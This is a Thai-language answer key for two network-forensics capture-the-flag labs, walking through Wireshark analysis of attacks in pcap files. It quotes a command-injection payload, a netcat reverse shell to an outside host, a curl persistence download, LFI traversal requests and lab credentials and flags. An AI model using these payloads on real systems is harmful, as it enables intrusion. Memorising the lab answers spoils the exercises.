# วิธีแก้ Lab 4–6

> เครื่องมือ: Wireshark (+ tshark), OpenSSL, 7-Zip/unzip, hex editor (HxD / `xxd`), `exiftool` หรือ `strings`
> เวลาทั้งหมดเป็น UTC+7 — ตั้ง View → Time Display Format → Date and Time of Day

## ขั้นตอนเริ่มต้นที่ใช้ได้กับทุกไฟล์

1. **Statistics → Conversations → แท็บ IPv4/TCP** ดูว่ามี IP ไหนคุยกับเซิร์ฟเวอร์บ้าง แล้วหา IP ภายนอกที่มีหลาย conversation ผิดปกติ
2. **Statistics → Protocol Hierarchy** ดูว่ามีโปรโตคอลอะไรบ้าง
3. กรองให้เหลือเฉพาะแพ็กเก็ตที่มีข้อมูล: `tcp.len > 0 || udp || icmp`
4. คลิกขวาที่แพ็กเก็ต → **Follow → TCP Stream** แล้วไล่ดูทีละ stream โดยเปลี่ยนเลข stream ที่มุมขวาล่าง
5. **Dwell Time** = เวลาแพ็กเก็ตสุดท้ายของแฮกเกอร์ − เวลาแพ็กเก็ตแรกของแฮกเกอร์ ใช้ filter `ip.addr == <hacker>` แล้วดูแถวแรกกับแถวสุดท้าย

## Lab 4 — SUS (`5.suspicious_traffic.pcap`)

### ขั้นที่ 1: หาตัวแฮกเกอร์
- Filter `http.request` จะเห็นว่า `192.168.1.50` ขอแค่ `GET /` ครั้งเดียวตามปกติ
- ส่วน `45.33.32.156` ขอ `/robots.txt` ด้วย **User-Agent `sqlmap/1.6`** ตัวนี้คือ **แฮกเกอร์**
  - Filter: `http.user_agent contains "sqlmap"`

### ขั้นที่ 2: ดูการโจมตีเว็บ
- Filter `ip.addr == 45.33.32.156 && http`
- Follow stream ของ `POST /admin/tools.php` จะเห็น body ที่ถูก URL-encode ไว้:
  - `host=127.0.0.1%3Bwhoami` → `127.0.0.1;whoami` ซึ่งเป็น **Command Injection** และ response คือ `www-data` แปลว่า **เจาะสำเร็จตอน 17:15:05**
  - POST ถัดมา (17:15:32) decode แล้วได้ `127.0.0.1; rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 45.33.32.156 1337 >/tmp/f` ซึ่งเป็น **reverse shell**
  - Tip: decode URL ได้ที่ CyberChef → URL Decode หรือดูที่ "HTML Form URL Encoded" ใน packet details

### ขั้นที่ 3: ดู reverse shell
- Filter `tcp.port == 1337` จะเห็นว่าฝั่ง **เหยื่อ (192.168.1.105) เป็นฝ่ายส่ง SYN ออกไปหาแฮกเกอร์** นี่คือลักษณะของ reverse shell
- Follow TCP Stream (stream 5) จะเห็นคำสั่งทั้งหมดตามนี้:

| เวลา | คำสั่ง | ผลลัพธ์ |
|---|---|---|
| 17:15:42 | `id; whoami` | www-data |
| 17:16:14 | `uname -a` | Linux prod-web-01 |
| 17:17:03 | `cd /var/www/html && ls -la` | พบ `db_config.php` |
| 17:17:42 | `cat db_config.php` | DB creds `portal_admin / Sup3rS3cur3_Db_P@ss!` |
| 17:18:36 | `find ... -name '*.bak' -o -name '*secret*'` | `/var/backups/restricted_system_token.bak` |
| 17:19:45 | `cat /var/backups/restricted_system_token.bak` | **FLAG** |
| 17:21:05 | `curl .../stage2.sh -o /tmp/.stage2.sh` | ดาวน์โหลด persistence |
| 17:22:58 | `rm -f /tmp/f /tmp/.stage2.sh` | ลบร่องรอย |
| 17:23:37 | `exit` | ปิด session |

- Filter `tcp.port == 8080` จะเห็นการ `GET /stage2.sh` ซึ่งเป็นสคริปต์ persistence beacon

### ขั้นที่ 4: Dwell Time
- แพ็กเก็ตแรก 17:14:15.000 (frame 14) และแพ็กเก็ตสุดท้าย 17:23:38.103 (frame 113) รวม **≈ 9 นาที 23 วินาที**
- ถ้านับเฉพาะ shell session (17:15:35 → 17:23:38) จะได้ **≈ 8 นาที 3 วินาที**

### คำตอบ
- **Hacker:** `45.33.32.156`
- **เจาะสำเร็จ:** 2026-11-01 17:15:05 (RCE) และ shell เชื่อมต่อได้ตอน 17:15:35
- **Flag:** `FLAG{pcap_revsh3ll_c2_d3t3ct3d_8921}`

## Lab 6 — OP (`6.operation_phantom_shift.pcap`) — Server `172.16.50.10`

### ขั้นที่ 1: แยกทราฟฟิกหลอกออก
- `172.16.50.5` ส่ง ARP, DNS, SMB negotiate และ `GET /assets/style.css` ซึ่งเป็นทราฟฟิกภายในปกติ
- `172.16.50.18` ส่ง ping (id 0x1337 ทำให้ดูน่าสงสัย) และ NTP ซึ่งเป็น **ตัวหลอก** ไม่มีการโจมตี
- `203.0.113.195` เป็น IP ภายนอกที่แตะ SSH, HTTP และ FTP จึงเป็น **แฮกเกอร์**
  - ดูได้จาก Statistics → Conversations → TCP จะเห็นว่า 6 จาก 8 conversation มาจาก IP นี้

### ขั้นที่ 2: ไล่ลำดับข้ามโปรโตคอล
Filter: `ip.addr == 203.0.113.195 && tcp.len > 0`

| เวลา | โปรโตคอล | สิ่งที่ทำ |
|---|---|---|
| 21:12:05 | SSH | ดึง banner `OpenSSH_8.9p1` แล้วตัดการเชื่อมต่อ (ไม่ได้ล็อกอิน) |
| 21:13:20 | HTTP | `GET /` พบลิงก์ `/reports/viewer.php` |
| 21:14:10 | HTTP | **LFI** `viewer.php?doc=../../../../etc/passwd` พบ user `audit_collector` |
| **21:15:22** | HTTP | **LFI** `?doc=../../../../var/secrets/vault.env` **อ่านไฟล์สำคัญสำเร็จ** |
| 21:17:10 | FTP | `USER audit_collector` / `PASS C0ll3ct0r_P@ss2026!` แล้วได้ 230 Login successful |
| 21:17:10 | FTP | `TYPE I`, `PASV` แล้ว `RETR security_audit.log` (528 bytes) |
| 21:17:45 | FTP-DATA | รับไฟล์ผ่าน port 50123 |
| 21:18:40 | FTP | `QUIT` |

- Filter ที่ช่วยได้: `http.request.uri contains ".."`, `ftp.request.command == "PASS"`, `ftp-data`
- เนื้อหา `vault.env` (stream 5):
  ```
  VAULT_CIPHER=AES-256-CBC
  VAULT_PASSPHRASE=Ph4nt0m_K3y_9941!
  BACKUP_FTP_USER=audit_collector
  BACKUP_FTP_PASS=C0ll3ct0r_P@ss2026!
  ```
- คำนวณ port จาก PASV: `(172,16,50,10,195,203)` → 195×256 + 203 = **50123**

### ขั้นที่ 3: ดึงไฟล์ที่ถูกเข้ารหัสออกมา
1. Filter `tcp.port == 50123` แล้ว Follow TCP Stream
2. เปลี่ยน "Show data as" เป็น **Raw** แล้วกด **Save as…** ตั้งชื่อ `audit.enc`
   - หรือใช้ File → Export Objects → FTP-DATA ก็ได้
3. ไฟล์ขึ้นต้นด้วย `Salted__` ซึ่งเป็น header ของ `openssl enc` (ตามด้วย salt 8 bytes)

### ขั้นที่ 4: ถอดรหัส
- ไฟล์ vault.env บอก cipher ไว้แล้ว (AES-256-CBC) ส่วน KDF ต้องลองหลายแบบ
  ```
  openssl enc -d -aes-256-cbc -md sha256 -pbkdf2 -pass "pass:Ph4nt0m_K3y_9941!" -in audit.enc -out out.bin
  ```

| ตัวเลือก | ผลลัพธ์ |
|---|---|
| `-md md5` | ได้ข้อมูลขยะ |
| `-md md5 -pbkdf2` | error `bad decrypt` |
| `-md sha256` (ไม่มี pbkdf2) | ได้ข้อมูลขยะ |
| **`-md sha256 -pbkdf2`** | ✅ ได้ไฟล์ที่มี `IHDR` |

### ขั้นที่ 5: ซ่อม header ไฟล์
- `xxd out.bin | head -2` แสดงผลแบบนี้:
  ```
  58 58 58 58 0D 0A 1A 0A 00 00 00 0D 49 48 44 52   XXXX........IHDR
  ```
- PNG ที่ถูกต้องต้องขึ้นต้นด้วย `89 50 4E 47 0D 0A 1A 0A` ในไฟล์นี้ 4 byte แรกถูกเปลี่ยนเป็น `XXXX`
- วิธีแก้มีสองแบบ:
  - เปิดด้วย HxD แล้วแก้ 4 byte แรกเป็น `89 50 4E 47` จากนั้นบันทึกเป็น `fixed.png`
  - หรือใช้คำสั่ง (bash):
    ```
    { printf '\x89PNG'; tail -c +5 out.bin; } > fixed.png
    ```

### ขั้นที่ 6: อ่าน Flag
- รูป (320×100) เป็นแค่กรอบว่าง **flag อยู่ใน metadata (chunk tEXt "Comment")**
  ```
  exiftool fixed.png      # หรือ strings fixed.png
  ```
  จะได้ `Classified Asset Recovered: FLAG{...}`

### ขั้นที่ 7: Dwell Time
- 21:12:05 (SSH) → 21:18:40 (FTP FIN) รวม **≈ 6 นาที 35 วินาที**
